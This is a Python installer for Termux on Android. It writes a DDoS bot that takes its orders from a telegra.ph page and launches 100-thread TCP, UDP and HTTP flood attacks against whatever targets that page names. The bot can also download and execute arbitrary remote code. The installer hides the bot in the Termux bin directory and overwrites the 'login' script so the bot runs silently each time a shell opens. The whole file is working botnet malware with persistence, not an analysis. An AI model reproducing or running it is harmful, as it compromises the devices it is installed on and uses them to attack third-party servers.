import os
file = open('system.py', 'w')

file.write('''import requests
import socket
import bs4
import threading
import urllib.request
import json

site = ''' + "'"+"https://telegra.ph/DDOS-SITE-BY-KILLNET-04-30"+"'" + '''
                                                   
def cust():
    try:
        exec(__script__)
    except:
        pass

def tcp():

    while what == '0':
        try:
            conn.send(duta.encode())
        except:
            pass
    conn.close()


def http():
    while what == '0':

        try:
            requests.get(a[0] + ':' + a[1])
        except:
            pass

def httpost():
    while what == '0':
        try:
            requests.post(a[0] + ':' + a[1], json={burunduk})
        except:
            pass

def udp():

    while what == '0':
        try:
            udp_socket.sendto(duta, addr)

        except:
            pass



conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

kavo = '1'

while True:

    try:

        yn = '0'

        url = requests.get(site)

        b = bs4.BeautifulSoup(url.text, "html.parser")

        url1 = b.select('article')
        url_print = url1[0].getText()
        url_print = url_print.replace(' ', '')
        a = url_print.split(',')



        if a != kavo:
            kavo = a
            what = '1'

            if a[0].lower() == 'stop' or a[0].lower == 'none':
                pass

            elif a[0].lower() == 'online':
                try:
                    requests.get(a[1])
                except:
                    pass

            elif a[0].lower() == 'custom':
                try:
                
                    __script__ = a[1]
                    with urllib.request.urlopen(__script__) as url:
                        __script__ = url.read()
                        threading.Thread(target=cust).start()
                except:
                    pass
            elif a[0].lower() == 'move':
                try:
                    requests.get(a[1])
                    site = a[1]
                except:
                    pass


            elif a[2].lower() == 'db':
                try:
                    burunduk = a[3].replace(';', ', ')
                    what = '0'
                    for i in range(100):
                        threading.Thread(target=httpost).start()
                except:
                    pass

#####

            elif a[2].lower() == 'http':
                what = '0'
                for i in range(100):
                    threading.Thread(target=http).start()
######


            elif a[2].lower() == 'tcp':
                try:
                    conn.connect((a[0], int(a[1])))
                    yn = '1'
                except:
                    try:
                        conn.connect(('google.com', 80))
                        conn.close()
                        conn.connect((a[0], int(a[1])))
                        yn = '1'
                    except:
                        pass

                if yn == '1':
                    what = '0'
                    if a[-1].lower() == 'tcp':
                        duta = 'by @wannadeauth (telegram)'
                        for i in range(100):
                            threading.Thread(target=tcp).start()
                    else:
                        duta = a[-1]
                        for i in range(100):
                            threading.Thread(target=tcp).start()

######

            elif a[2].lower() == 'udp':
                addr = (a[0], int(a[1]))
                what = '0'
                if a[-1].lower() == 'udp':
                    duta = 'by @wannadeauth (telegram)'
                    for i in range(100):
                        threading.Thread(target=udp).start()
                else:
                    duta = a[-1]
                    for i in range(100):
                        threading.Thread(target=udp).start()

######

            else:
                pass
    except:
        pass
''')

os.system('cp system.py /data/data/com.termux/files/usr/bin')


file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('''#!/data/data/com.termux/files/usr/bin/sh

python system.py &
clear

if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
        cat /data/data/com.termux/files/usr/etc/motd
else
        # This variable shouldn't be kept set.
        unset TERMUX_HUSHLOGIN
fi

if [ -G ~/.termux/shell ]; then
        export SHELL="`realpath ~/.termux/shell`"
else
        for file in /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/bin/sh /system/bin/sh; do
                if [ -x $file ]; then
                        export SHELL=$file
                        break
                fi
        done
fi

if [ -f /data/data/com.termux/files/usr/lib/libtermux-exec.so ]; then
        export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so
        $SHELL -c "coreutils --coreutils-prog=true" > /dev/null 2>&1 || unset LD_PRELOAD
fi

if [ -n "$TERM" ]; then
        exec "$SHELL" -l "$@"
else
        exec "$SHELL" "$@"
fi

''')
file.close()


os.system('python system.py &')
